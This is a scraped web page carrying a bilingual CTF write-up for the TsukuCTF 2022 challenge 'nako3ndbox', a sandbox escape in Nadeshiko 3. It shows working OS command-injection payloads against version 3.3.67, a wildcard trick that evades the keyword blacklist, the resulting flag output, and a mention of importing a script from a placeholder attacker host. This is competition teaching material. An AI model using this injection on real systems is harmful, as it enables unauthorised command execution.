<span> _ __   __ _</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> _____</span><span class="token token" style="color:#67cdcc">|</span><span>___ / _ __   __</span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#67cdcc">|</span><span>__   _____  __
</span><span></span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _` | |/ / _ \ |_ \| &#x27;</span><span>_ </span><span class="token token" style="color:#ccc">\</span><span> / _` </span><span class="token token" style="color:#67cdcc">|</span><span> </span><span class="token token" style="color:#7ec699">&#x27;_ \ / _ \ \/ /
</span><span class="token token" style="color:#7ec699">| | | | (_| |   &lt; (_) |__) | | | | (_| | |_) | (_) &gt;  &lt;
</span><span class="token token" style="color:#7ec699">|_| |_|\__,_|_|\_\___/____/|_| |_|\__,_|_.__/ \___/_/\_\
</span><span class="token token" style="color:#7ec699">
</span><span class="token token" style="color:#7ec699">------------------------------------------------------------
</span><span class="token token" style="color:#7ec699">日本語コード：圧縮解凍ツールパスは「&#x27;</span><span>&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sh</span><span> ./f*</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;」。「」を「」へ解凍
</span><span class="token token" style="color:#7ec699">/bin/sh: &#x27;</span><span class="token token" style="color:#f8c555">:</span><span> not found
</span><span>./flag.txt: line </span><span class="token token" style="color:#f08d49">1</span><span>: TsukuCTF22</span><span class="token token" style="color:#ccc">{</span><span>y0u_jump3d_0u7_0f_j4p4n353</span><span class="token token" style="color:#ccc">}</span><span>: not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span><span></span><span class="token token" style="color:#ccc">[</span><span>実行時エラー</span><span class="token token" style="color:#ccc">]</span><span>app</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">1</span><span>行目</span><span class="token token" style="color:#ccc">)</span><span>: Command failed: </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">\</span><span>&#x27;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#f08d49">sh</span><span> ./f*</span><span class="token token" style="color:#ccc">;</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> x </span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -o</span><span class="token token" style="color:#7ec699">&#x27;&#x27;</span><span> -y
</span>/bin/sh: &#x27;: not found
<span>./flag.txt: line </span><span class="token token" style="color:#f08d49">1</span><span>: TsukuCTF22</span><span class="token token" style="color:#ccc">{</span><span>y0u_jump3d_0u7_0f_j4p4n353</span><span class="token token" style="color:#ccc">}</span><span>: not found
</span><span>/bin/sh: </span><span class="token token" style="color:#f8c555">:</span><span> Permission denied
</span>~~~
</code></div></pre>
<p>Now you get the FLAG.</p>
<h2>TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}</h2></div><div class="Footer_footer__WOAaR">© 2021-<!-- -->2022<!-- --> SecHack365-Fans All Right Reserved.</div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"nako3ndbox","contentHtml":"# nako3ndbox\n\n## 問題文\n\nに・ほ・ん・ご・で・あ・そ・ぼ\\\n`nc tsukuctf.sechack365.com 31418`\n\n## 難易度\n\n**medium**\n\n## 作問にあたって\n\nなでしこ 3 の修正済みである脆弱性を使った Jail 問題です。\\\nもともとは最新版を使い`！「http://ctf.example.com/attack.js」を取り込み`で RCE させようと思っていましたが、`ナデシコする`でうまく動かないため、見つけた脆弱性を用いる事にしました。\\\n一応、CVE-2022-41642 のバイパスなのでまだ CVE はついていません(頑張れば脆弱性なしで解けます)。\n\n## 解法\n\nなでしこ 3 を用いた Jail 問題のようだ。\\\n配布されたソースは以下のようであった。\n\n```bash\n「------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------」と言う\n\n「日本語コード：」と尋ねる\nそれを入力に代入\n\nブラックリスト＝「読、開、保存、実行、起動、サーバ、フォルダ、ファイル、ナデシコ、ディレクトリ、flag」を「、」で区切る\n\nブラックリスト！＝空の間\n　　ブラックリストの０から１を配列取り出す\n　　もし（入力でそれの出現回数）！＝０ならば\n　　　　「日本語の世界からは出しませんよ！！！」と言う\n　　　　終了する\n　　ここまで\nここまで\n\n「｛入力｝」をナデシコする\n\n終了する\n```\n\n入力された文字列をブラックリストで検証し、eval にあたる`ナデシコする`で実行している。\\\nブラックリストがない場合、`「ls」を起動`などで RCE 可能だが今回は難しい。\\\nここで配布されたファイルより、なでしこ 3 が最新版でなく、3.3.67 である点に注目する。\\\nGitHub の Issues を見てやると[cnako3 の圧縮解凍の問題](https://github.com/kujirahand/nadesiko3/issues/1325)が見つかる。\\\n複数のシングルクォートを圧縮解凍系の処理に含めることで、OS コマンドインジェクションが可能なようだ。\\\nこの修正を参考に任意コード実行を行う。\\\n今回は以下のように`圧縮解凍ツールパス`の引数としてコマンドを与える。\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sleep 10;'' x '' -o'' -y\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n~~~\n```\n\n`sleep 10`を行うと 10 秒スリープした。\\\nフラグは`flag.txt`にあるので読みだせばよいが、`flag`がブラックリストにある。\\\n`./f*`などで回避してやればよい。\\\nコマンドの実行結果がなぜか出てこないことがあるので、`sh`に渡してエラーとして吐き出せばよい。\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sh ./f*;'' x '' -o'' -y\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n~~~\n```\n\nflag が得られた。\n\n## TsukuCTF22{y0u\\_jump3d\\_0u7\\_0f\\_j4p4n353}\n\n## Abstract\n\nThis is a Jail related to a known vulnerability in なでしこ 3\nFirst I intended to make a RCE question by `！「http://ctf.example.com/attack.js」を取り込み`. However, `ナデシコする` didn't work well. Thats why I use the vulnerability instead.\n\n## Solve\n\nThis seems Jail with なでしこ 3.\nThe ditributed source code is the following.\n\n```\n```\n\n\u003c!-- XXXX:なでしこソース追加 --\u003e\n\nThis program execute the given strings with `ナデシコする` which corresponds to the eval command after given strings are checked.\nYou could RCE by `「ls」を起動` if it were not checked. We can't do this for this case.\nBtw, this is ver 3.3.67 which is not the latest one and this has [an issue related to cnako3](https://github.com/kujirahand/nadesiko3/issues/1325)\nThis is OS command injection. You can use this vulnerability.\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sleep 10;'」。「」を「」へ解凍\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sleep 10;'' x '' -o'' -y\n/bin/sh: ': not found\n/bin/sh: : Permission denied\n~~~\n```\n\n`sleep 10` make the thread sleep for 10 seconds.\nAs the `flag` is blacklisted, you should specify like `./f*` to get `flag.txt`.\nI don't know why but sometimes we can't get the result. So get the result as Error Message through `sh` instead.\n\n```bash\n$ nc tsukuctf.sechack365.com 31418\n------------------------------------------------------------\n             _        _____           _ _\n _ __   __ _| | _____|___ / _ __   __| | |__   _____  __\n| '_ \\ / _` | |/ / _ \\ |_ \\| '_ \\ / _` | '_ \\ / _ \\ \\/ /\n| | | | (_| |   \u003c (_) |__) | | | | (_| | |_) | (_) \u003e  \u003c\n|_| |_|\\__,_|_|\\_\\___/____/|_| |_|\\__,_|_.__/ \\___/_/\\_\\\n\n------------------------------------------------------------\n日本語コード：圧縮解凍ツールパスは「'';sh ./f*;'」。「」を「」へ解凍\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n[実行時エラー]app(1行目): Command failed: ''\\''';sh ./f*;'' x '' -o'' -y\n/bin/sh: ': not found\n./flag.txt: line 1: TsukuCTF22{y0u_jump3d_0u7_0f_j4p4n353}: not found\n/bin/sh: : Permission denied\n~~~\n```\n\nNow you get the FLAG.\n\n## TsukuCTF22{y0u\\_jump3d\\_0u7\\_0f\\_j4p4n353}\n","title":"nako3ndbox","description":"なでしこのサンドボックス問題","author":"Satoki","genre":"Misc","solver":6,"point":500}},"__N_SSG":true},"page":"/ctf/TsukuCTF2022/[id]","query":{"id":"nako3ndbox"},"buildId":"W-A5gUEQIZeK9QIr63Xog","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>